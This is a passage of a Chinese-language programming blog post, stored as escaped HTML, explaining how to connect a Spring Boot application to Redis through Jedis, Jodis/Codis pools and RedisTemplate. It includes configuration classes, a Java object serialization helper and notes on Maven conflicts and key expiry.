&#125;)</span><br><span class=\"line\">public class JodisConfig &#123;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.zkPath&#125;&quot;)</span><br><span class=\"line\">    private String zkPath;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.product&#125;&quot;)</span><br><span class=\"line\">    private String product;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.zkPassword&#125;&quot;)</span><br><span class=\"line\">    private String zkPassword;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.zkTimeout&#125;&quot;)</span><br><span class=\"line\">    private int zkTimeout;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.maxTotal&#125;&quot;)</span><br><span class=\"line\">    private String maxTotal;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.maxWaitMillis&#125;&quot;)</span><br><span class=\"line\">    private String maxWaitMillis;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.poolMinIdle&#125;&quot;)</span><br><span class=\"line\">    private int poolMinIdele;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.poolMaxIdle&#125;&quot;)</span><br><span class=\"line\">    private int poolMaxIdle;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.testOnBorrow&#125;&quot;)</span><br><span class=\"line\">    private boolean testOnBorrow;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.testOnReturn&#125;&quot;)</span><br><span class=\"line\">    private boolean testOnReturn;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Bean</span><br><span class=\"line\">    public JedisResourcePool zkJedisPool()&#123;</span><br><span class=\"line\">        JedisResourcePool jedisPool = null;</span><br><span class=\"line\"></span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            JedisPoolConfig config = new JedisPoolConfig();</span><br><span class=\"line\">            config.setMaxTotal(Integer.parseInt(maxTotal));</span><br><span class=\"line\">            config.setMaxWaitMillis(Integer.parseInt(maxWaitMillis));</span><br><span class=\"line\">            config.setMaxIdle(poolMaxIdle);</span><br><span class=\"line\">            config.setMinIdle(poolMinIdele);</span><br><span class=\"line\">            config.setTestOnBorrow(testOnBorrow);</span><br><span class=\"line\">            config.setTestOnReturn(testOnReturn);</span><br><span class=\"line\">            jedisPool = RoundRobinJedisPool.create().curatorClient(zkPath, zkTimeout)</span><br><span class=\"line\">                    .zkProxyDir(product).password(zkPassword)</span><br><span class=\"line\">                    .poolConfig(config).build();</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            System.out.println(&quot;jodis 连接出错。&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return jedisPool;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>使用<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.redisdemo.jodis;</span><br><span class=\"line\"></span><br><span class=\"line\">import com.example.redisdemo.jedis.ObjectTranscoder;</span><br><span class=\"line\">import com.wandoulabs.jodis.JedisResourcePool;</span><br><span class=\"line\">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class=\"line\">import org.springframework.stereotype.Service;</span><br><span class=\"line\">import redis.clients.jedis.Jedis;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.util.List;</span><br><span class=\"line\"></span><br><span class=\"line\">@Service</span><br><span class=\"line\">public class JodisServer &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Autowired</span><br><span class=\"line\">    JedisResourcePool jedisResourcePool;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void setKey(String key, Object value, int time)&#123;</span><br><span class=\"line\">        Jedis jedis = jedisResourcePool.getResource();</span><br><span class=\"line\">        jedis.setex(key.getBytes(),time, ObjectTranscoder.serialize(value));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public void setKey(String key, Object value)&#123;</span><br><span class=\"line\">        Jedis jedis = jedisResourcePool.getResource();</span><br><span class=\"line\">        System.out.println(&quot;ttl: &quot;);</span><br><span class=\"line\">        System.out.println(jedis.ttl(key));</span><br><span class=\"line\">        //long转int,向下转换，可能溢出，不能直接转换，所以long -&gt; String -&gt; int</span><br><span class=\"line\">        jedis.setex(key.getBytes(),Integer.parseInt(String.valueOf(jedis.ttl(key))), ObjectTranscoder.serialize(value));</span><br><span class=\"line\">        //jedis.setex(key.getBytes(),20, ObjectTranscoder.serialize(value));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public Object getKey(String key)&#123;</span><br><span class=\"line\">        Jedis jedis = jedisResourcePool.getResource();</span><br><span class=\"line\">        if(jedis == null || !jedis.exists(key.getBytes()))&#123;</span><br><span class=\"line\">            return null;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        byte[] in = jedis.get(key.getBytes());</span><br><span class=\"line\">        List list = (List) ObjectTranscoder.deserialize(in);</span><br><span class=\"line\">        return list;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"2-一些注意事项\"><a href=\"#2-一些注意事项\" class=\"headerlink\" title=\"2.一些注意事项\"></a>2.一些注意事项</h2><h3 id=\"2-1-存储数据\"><a href=\"#2-1-存储数据\" class=\"headerlink\" title=\"2.1 存储数据\"></a>2.1 存储数据</h3><p>在jedis存储数据过程中<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public String set(String key, String value) &#123;</span><br><span class=\"line\">  this.checkIsInMultiOrPipeline();</span><br><span class=\"line\">  this.client.set(key, value);</span><br><span class=\"line\">  return this.client.getStatusCodeReply();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>类型为String,String 所以我们要存储List数据，需要先进行序列化<br><br>Serialization（序列化）是一种将对象以一连串的字节描述的过程；反序列化deserialization是一种将这些字节重建成一个对象的过程。<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//存</span><br><span class=\"line\">public  void setKey(String key, Object value)&#123;</span><br><span class=\"line\">  Jedis jedis = jedisPool.getResource();</span><br><span class=\"line\">  jedis.set(key.getBytes(), ObjectTranscoder.serialize(value));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//取</span><br><span class=\"line\">public Object getKey(String key)&#123;</span><br><span class=\"line\">    Jedis jedis = jedisPool.getResource();</span><br><span class=\"line\">    if(jedis == null || !jedis.exists(key.getBytes()))&#123;</span><br><span class=\"line\">        return null;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    byte[] in = jedis.get(key.getBytes());</span><br><span class=\"line\">    List list = (List) ObjectTranscoder.deserialize(in);</span><br><span class=\"line\">    return list;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>序列化工具类<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.redisdemo.jedis;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.io.*;</span><br><span class=\"line\"></span><br><span class=\"line\">//序列化工具类</span><br><span class=\"line\">public class ObjectTranscoder &#123;</span><br><span class=\"line\">    public static byte[] serialize(Object value) &#123;</span><br><span class=\"line\">        if (value == null) &#123;</span><br><span class=\"line\">            throw new NullPointerException(&quot;Can&apos;t serialize null&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        byte[] rv=null;</span><br><span class=\"line\">        ByteArrayOutputStream bos = null;</span><br><span class=\"line\">        ObjectOutputStream os = null;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            bos = new ByteArrayOutputStream();</span><br><span class=\"line\">            os = new ObjectOutputStream(bos);</span><br><span class=\"line\">            os.writeObject(value);</span><br><span class=\"line\">            os.close();</span><br><span class=\"line\">            bos.close();</span><br><span class=\"line\">            rv = bos.toByteArray();</span><br><span class=\"line\">        &#125; catch (IOException e) &#123;</span><br><span class=\"line\">            throw new IllegalArgumentException(&quot;Non-serializable object&quot;, e);</span><br><span class=\"line\">        &#125; finally &#123;</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                if(os!=null)os.close();</span><br><span class=\"line\">                if(bos!=null)bos.close();</span><br><span class=\"line\">            &#125;catch (Exception e2) &#123;</span><br><span class=\"line\">                e2.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return rv;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static Object deserialize(byte[] in) &#123;</span><br><span class=\"line\">        Object rv=null;</span><br><span class=\"line\">        ByteArrayInputStream bis = null;</span><br><span class=\"line\">        ObjectInputStream is = null;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            if(in != null) &#123;</span><br><span class=\"line\">                bis=new ByteArrayInputStream(in);</span><br><span class=\"line\">                is=new ObjectInputStream(bis);</span><br><span class=\"line\">                rv=is.readObject();</span><br><span class=\"line\">                is.close();</span><br><span class=\"line\">                bis.close();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; catch (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;finally &#123;</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                if(is!=null)is.close();</span><br><span class=\"line\">                if(bis!=null)bis.close();</span><br><span class=\"line\">            &#125; catch (Exception e2) &#123;</span><br><span class=\"line\">                e2.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return rv;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"2-2-maven包冲突\"><a href=\"#2-2-maven包冲突\" class=\"headerlink\" title=\"2.2 maven包冲突\"></a>2.2 maven包冲突</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- redis --&gt;</span><br><span class=\"line\"> &lt;!--&lt;dependency&gt;--&gt;</span><br><span class=\"line\">     &lt;!--&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;--&gt;</span><br><span class=\"line\">     &lt;!--&lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;--&gt;</span><br><span class=\"line\"> &lt;!--&lt;/dependency&gt;--&gt;</span><br><span class=\"line\"> &lt;dependency&gt;</span><br><span class=\"line\">     &lt;groupId&gt;redis.clients&lt;/groupId&gt;</span><br><span class=\"line\">     &lt;artifactId&gt;jedis&lt;/artifactId&gt;</span><br><span class=\"line\">     &lt;version&gt;2.7.3&lt;/version&gt;</span><br><span class=\"line\"> &lt;/dependency&gt;</span><br><span class=\"line\"> &lt;dependency&gt;</span><br><span class=\"line\">     &lt;groupId&gt;com.wandoulabs.jodis&lt;/groupId&gt;</span><br><span class=\"line\">     &lt;artifactId&gt;jodis&lt;/artifactId&gt;</span><br><span class=\"line\">     &lt;version&gt;0.2.2&lt;/version&gt;</span><br><span class=\"line\"> &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n<p>springboot自己集成的spring-boot-data-redis与redis-clients有冲突<br><br>redis-clients可以与jodis配合使用，所以选择redis-clients.</p>\n<h3 id=\"2-3-关于redis过期时间\"><a href=\"#2-3-关于redis过期时间\" class=\"headerlink\" title=\"2.3 关于redis过期时间\"></a>2.3 关于redis过期时间</h3><p>redis默认不过期，当内存满时，删除先存入的<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//存短信记录,首次，设置过期时间</span><br><span class=\"line\">   public void setJodisWithTime(String key, Object value, int time)&#123;</span><br><span class=\"line\">       Jedis jedis = jedisResourcePool.getResource();</span><br><span class=\"line\">       //set(String, String) 所以List需要序列化，有效时间为time</span><br><span class=\"line\">       jedis.setex(key.getBytes(),time, FrequencyVerifiy.serialize(value));</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   //存短信记录，不重新设置过期时间,使用原有的</span><br><span class=\"line\">   public void setJodis(String key, Object value)&#123;</span><br><span class=\"line\">       Jedis jedis = jedisResourcePool.getResource();</span><br><span class=\"line\">       //使用原有时间</span><br><span class=\"line\">       int time = Integer.parseInt(String.valueOf(jedis.ttl(key)));</span><br><span class=\"line\">       jedis.setex(key.getBytes(),time, FrequencyVerifiy.serialize(value));</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"一-Springboot集成Redis\"><a href=\"#一-Springboot集成Redis\" class=\"headerlink\" title=\"一.Springboot集成Redis\"></a>一.Springboot集成Redis</h1><ul>\n<li>maven依赖</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">\t\t&lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>application.properties</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">spring.redis.host=127.0.0.1</span><br><span class=\"line\">spring.redis.port=6379</span><br></pre></td></tr></table></figure>\n<ul>\n<li>配置类</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Configuration</span><br><span class=\"line\">public class RedisConfig  &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    //spring 封装了 RedisTemplate 对象来进行对redis的各种操作，它支持所有的 redis 原生的 api</span><br><span class=\"line\">    @Bean</span><br><span class=\"line\">    public RedisTemplate redisTemplate(RedisConnectionFactory factory)&#123;</span><br><span class=\"line\">        RedisTemplate&lt;String,Object&gt; redisTemplate = new RedisTemplate&lt;&gt;();</span><br><span class=\"line\">        //设置序列化方式,不设置value</span><br><span class=\"line\">        RedisSerializer redisSerializer =new StringRedisSerializer();</span><br><span class=\"line\">        redisTemplate.setKeySerializer(redisSerializer);</span><br><span class=\"line\">        redisTemplate.setHashKeySerializer(redisSerializer);</span><br><span class=\"line\">        //连接</span><br><span class=\"line\">        redisTemplate.setConnectionFactory(factory);</span><br><span class=\"line\">        return redisTemplate;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>使用</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Service</span><br><span class=\"line\">public class RedisDemo &#123;</span><br><span class=\"line\">    @Autowired</span><br><span class=\"line\">    RedisTemplate redisTemplate;</span><br><span class=\"line\"></span><br><span class=\"line\">    public  void setKey(String key, Object value)&#123;</span><br><span class=\"line\">        ValueOperations&lt;String,Object&gt; vo = redisTemplate.opsForValue();</span><br><span class=\"line\">        vo.set(key, value);</span><br><span class=\"line\">        //设置过期时间</span><br><span class=\"line\">        redisTemplate.expire(key,600,TimeUnit.SECONDS);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public  Object getKey(String key)&#123;</span><br><span class=\"line\">        ValueOperations&lt;String,Object&gt; vo = redisTemplate.opsForValue();</span><br><span class=\"line\">        return vo.get(key);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"1-redis大概\"><a href=\"#1-redis大概\" class=\"headerlink\" title=\"1.redis大概\"></a>1.redis大概</h2><h3 id=\"1-2-Jedis\"><a href=\"#1-2-Jedis\" class=\"headerlink\" title=\"1.2 Jedis\"></a>1.2 Jedis</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">\t&lt;groupId&gt;redis.clients&lt;/groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;jedis&lt;/artifactId&gt;</span><br><span class=\"line\">\t&lt;version&gt;2.7.3&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br><span class=\"line\">&lt;!-- Springboot自带的redis与redis.clients有冲突，为了使用jodis,选redis.clients --&gt;</span><br><span class=\"line\">&lt;!--&lt;dependency&gt;--&gt;</span><br><span class=\"line\">    &lt;!--&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;--&gt;</span><br><span class=\"line\">    &lt;!--&lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;--&gt;</span><br><span class=\"line\">&lt;!--&lt;/dependency&gt;--&gt;</span><br></pre></td></tr></table></figure>\n<p>通过redis.clients.jedis.JedisPool来管理，即通过池来管理，通过池对象获取jedis实例，然后通过jedis实例直接操作redis服务，剔除了与业务无关的冗余代码<br><br></p>\n<p>配置类<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.redisdemo.jedis;</span><br><span class=\"line\"></span><br><span class=\"line\">import org.springframework.beans.factory.annotation.Value;</span><br><span class=\"line\">import org.springframework.context.annotation.Bean;</span><br><span class=\"line\">import org.springframework.context.annotation.Configuration;</span><br><span class=\"line\">import org.springframework.context.annotation.PropertySource;</span><br><span class=\"line\">import redis.clients.jedis.JedisPool;</span><br><span class=\"line\">import redis.clients.jedis.JedisPoolConfig;</span><br><span class=\"line\"></span><br><span class=\"line\">@Configuration</span><br><span class=\"line\">@PropertySource(&#123; &quot;classpath:application.properties&quot; &#125;)</span><br><span class=\"line\">public class JedisConfig &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Bean</span><br><span class=\"line\">    public JedisPool getJedisPool()&#123;</span><br><span class=\"line\">        JedisPoolConfig config = new JedisPoolConfig();</span><br><span class=\"line\">        //连接设置</span><br><span class=\"line\">        //config.setMaxTotal(Integer.parseInt(maxTotal));</span><br><span class=\"line\">        //config.set（等等）</span><br><span class=\"line\">        //建立连接</span><br><span class=\"line\">        JedisPool jedisPool = new JedisPool(config, &quot;127.0.0.1&quot;, 6379);</span><br><span class=\"line\">        return jedisPool;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>使用<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.redisdemo.jedis;</span><br><span class=\"line\"></span><br><span class=\"line\">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class=\"line\">import org.springframework.stereotype.Service;</span><br><span class=\"line\">import redis.clients.jedis.Jedis;</span><br><span class=\"line\">import redis.clients.jedis.JedisPool;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.util.List;</span><br><span class=\"line\"></span><br><span class=\"line\">@Service</span><br><span class=\"line\">public class JedisServer &#123;</span><br><span class=\"line\">    @Autowired</span><br><span class=\"line\">    JedisPool jedisPool;</span><br><span class=\"line\"></span><br><span class=\"line\">    public  void setKey(String key, Object value)&#123;</span><br><span class=\"line\">        //try/catch后面添加</span><br><span class=\"line\">        Jedis jedis = jedisPool.getResource();</span><br><span class=\"line\">         //set(String, String) 所以List需要序列化,此处value为list</span><br><span class=\"line\">        //jedis.set(key.getBytes(), ObjectTranscoder.serialize(value));</span><br><span class=\"line\">        //设置过期时间</span><br><span class=\"line\">        jedis.setex(key.getBytes(),600, ObjectTranscoder.serialize(value));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public Object getKey(String key)&#123;</span><br><span class=\"line\">        Jedis jedis = jedisPool.getResource();</span><br><span class=\"line\">        if(jedis == null || !jedis.exists(key.getBytes()))&#123;</span><br><span class=\"line\">            return null;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        byte[] in = jedis.get(key.getBytes());</span><br><span class=\"line\">        List list = (List) ObjectTranscoder.deserialize(in);</span><br><span class=\"line\">        return list;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"1-3-Jodis\"><a href=\"#1-3-Jodis\" class=\"headerlink\" title=\"1.3 Jodis\"></a>1.3 Jodis</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;redis.clients&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;jedis&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;2.7.3&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;com.wandoulabs.jodis&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;jodis&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;0.2.2&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n<p>与codis结合使用对jedispool做了封装。<br><br>通过zookeeper上注册的codis proxy个数创建相应个数的jedispool封装<br>为RoundRobinJedisPool，并监听节点的变化，proxy的地址会传回来，可以及时增删配置的jedispool<br></p>\n<p>配置类<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span 